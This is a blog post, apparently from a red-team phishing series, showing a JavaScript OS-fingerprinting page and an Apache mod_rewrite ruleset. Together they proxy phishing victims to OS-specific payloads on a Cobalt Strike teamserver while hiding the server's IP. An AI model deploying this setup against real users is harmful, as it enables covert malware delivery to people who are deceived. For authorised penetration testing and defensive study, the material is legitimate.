---
layout: post
title: Operating System Based Redirection with Apache mod_rewrite
summary: Redirect your phishing victims to different payloads or sites based on their operating system.
tags: 
- mod_rewrite
- phishing
---

At times you may find yourself testing an environment comprised of a fair mix of operating systems. Maybe the marketing department is half Windows and half Mac OS X. In these cases, it may not be feasible to determine users' operating systems via a preliminary phish.

OS detection is nothing new. The goal of this method is to allow us to perform detection and proxying in one place while looking as legitimate as possible to the phish victim. No URL changing, no excessive page reloads and refreshes. This detection method is similar to my [previous post]({{site.baseurl}}/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/) about redirecting mobile users; however, leveraging JavaScript provides a more reliable method of operating system detection.


![OS Detection Demo](/assets/apache/os-detection-demo.gif)

{:#os-detector-page}

# OS Detector Page

The HTML code below (based on OS detection code from [javascripter.net](http://www.javascripter.net/faq/operatin.htm)) uses JavaScript to detect the user's OS and appends a URL parameter (*os_id*) to the end of the request. If the user's OS doesn't match Windows, Mac OS X, Unix, or Linux, *unknown* will be assigned to the *os_id*.

The HTML only needs to be modified if you are using the parameter *os_id* in one of the payloads or if you opt to add more granular detection, such as by OS version. The HTML file should be hosted on a Cobalt Strike teamserver or other pivoting server, such as a redirector.

```html
<html><head></head>
<body>

<script>
var url_base='http://'+window.location.host;
var OSName="unknown";
var query_string=document.location.search;
var request_path=window.location.pathname.substr(1);
if (navigator.appVersion.indexOf("Win")!=-1) OSName="windows";
if (navigator.appVersion.indexOf("Mac")!=-1) OSName="mac";
if (navigator.appVersion.indexOf("X11")!=-1) OSName="unix";
if (navigator.appVersion.indexOf("Linux")!=-1) OSName="linux";

var os_string='&os_id='+OSName;
if (query_string == '') os_string='?os_id='+OSName;
if (query_string.indexOf("os_id=")!=-1) os_string='';

window.location.replace(url_base+'/'+request_path+query_string+os_string);

</script>

</body></html>
```

{:#mod_rewrite-rules}

# mod_rewrite Rules

The following ruleset should be placed in a *.htaccess* file on your Apache redirector. Replace the *TEAMSERVER-IP* and OS payload placeholders with the IP and paths that correspond to your infrastructure for the campaign. The *OS-DETECTOR* placeholder should be replaced by the path of the above HTML file on your teamserver.

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">os_id=mac</span><br>
RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP/MAC-OS-X-PAYLOAD</span> <span style="color: tomato">[P]</span><br>

RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">os_id=windows</span><br>
RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP/WINDOWS-PAYLOAD</span> <span style="color: tomato">[P]</span><br>
RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">os_id=unix</span><br>
RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP/UNIX-PAYLOAD</span> <span style="color: tomato">[P]</span><br>
RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">os_id=linux</span><br>
RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP/LINUX-PAYLOAD</span> <span style="color: tomato">[P]</span><br>
RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">os_id=unknown</span><br>
RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP/UNKNOWN-OS-PAYLOAD</span> <span style="color: tomato">[P]</span><br>
RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-WAN-IP/OS-DETECTOR.HTML</span> <span style="color: tomato">[P]</span><br>
</div>

Line by line explanation:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request's query string</span> <span style="color: mediumseagreen">contains an 'os_id' parameter with a value of 'mac':</span><br>
<span style="color: gold">Change the entire request</span> <span style="color: orange">to serve 'MAC-OS-X-PAYLOAD' from the teamserver's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
<span style="color: dodgerblue">Otherwise, if the request's query string</span> <span style="color: mediumseagreen">contains an 'os_id' parameter with a value of 'windows':</span><br>
<span style="color: gold">Change the entire request</span> <span style="color: orange">to serve 'WINDOWS-PAYLOAD' from the teamserver's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
<span style="color: dodgerblue">Otherwise, if the request's query string</span> <span style="color: mediumseagreen">contains an 'os_id' parameter with a value of 'unix':</span><br>
<span style="color: gold">Change the entire request</span> <span style="color: orange">to serve 'UNIX-PAYLOAD' from the teamserver's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
<span style="color: dodgerblue">Otherwise, if the request's query string</span> <span style="color: mediumseagreen">contains an 'os_id' parameter with a value of 'linux':</span><br>
<span style="color: gold">Change the entire request</span> <span style="color: orange">to serve 'LINUX-PAYLOAD' from the teamserver's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
<span style="color: dodgerblue">Otherwise, if the request's query string</span> <span style="color: mediumseagreen">contains an 'os_id' parameter with a value of 'unknown':</span><br>
<span style="color: gold">Change the entire request</span> <span style="color: orange">to serve 'UNKNOWN-OS-PAYLOAD' from the teamserver's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
If none of the above conditions are met, <span style="color: gold">change the entire request</span> <span style="color: orange">to serve 'OS-DETECTOR.HTML' from the teamserver's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
</div>


In short, the ruleset checks requests for each of the OS parameters and proxies requests to the the designated payload path. The user's address bar will still read the path to they entered or clicked to get to the OS detector. As it's written, the ruleset redirects any request received to the *.htaccess* file's directory and any subdirectory to the OS detector page. If you would like to selectively redirect to that file, you can add a RewriteCond line above and catch-all RewriteRule line on the last line. See my previous mod_rewrite post about [invalid uri redirection]({{site.baseurl}}/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite) of for a more specific example.

{:#expanding-capabilities}

# Expanding Capabilities

Since the detection is simply using JavaScript to fingerprint the end-user's host and using mod_rewrite to determine the correct page to serve, one could easily expand the script to serve payloads based upon any number of criteria. For instance, the script above doesn't detect specific versions of operating systems. If that level of granularity is required, consider using the user agent to perform detection. 

An example would be to change the conditional statement in the HTML page from:

```javascript
navigator.appVersion.indexOf("Win")!=-1
```

to

```javascript
navigator.userAgent.indexOf("Windows NT 6.1")!=-1
```

The second conditional line checks for Windows 7 rather than just Windows. User agents can be spoofed or removed, so be it's a good idea to build in a backup detection method if you aren't sure the user agents will be in tact.

{:#summary}

# Summary

Operating system detection enables phishing campaigns to serve payloads based upon maximum impact per host type, rather than broadest applicability. This allows you to tailor not only the infection vector, such as Java vs. HTA, but also the post-exploit toolset, such as Cobalt Strike vs. Metasploit, based upon the likelihood of success. This capability can be extended even further to serve up specific operating system or application versions. 


# Strengthen Your Phishing with Apache mod_rewrite Posts

* [Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection]({{site.baseurl}}/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/)
* [Invalid URI Redirection]({{site.baseurl}}/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/)
* Operating System Based Redirection with Apache mod_rewrite
* [Combatting Incident Responders with Apache mod_rewrite]({{site.baseurl}}/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/)
* [Expire Phishing Links with Apache RewriteMap]({{site.baseurl}}/2016-04-19-expire-phishing-links-with-apache-rewritemap/)


{:#resources}

# Resources

* [mod-rewrite-cheatsheet.com](http://mod-rewrite-cheatsheet.com)
* [Official Apache 2.4 mod_rewrite Documentation](http://httpd.apache.org/docs/current/rewrite/)
	* [Apache mod_rewrite Introduction](https://httpd.apache.org/docs/2.4/en/rewrite/intro.html)
* [An In-Depth Guide to mod_rewrite for Apache](http://code.tutsplus.com/tutorials/an-in-depth-guide-to-mod_rewrite-for-apache--net-6708)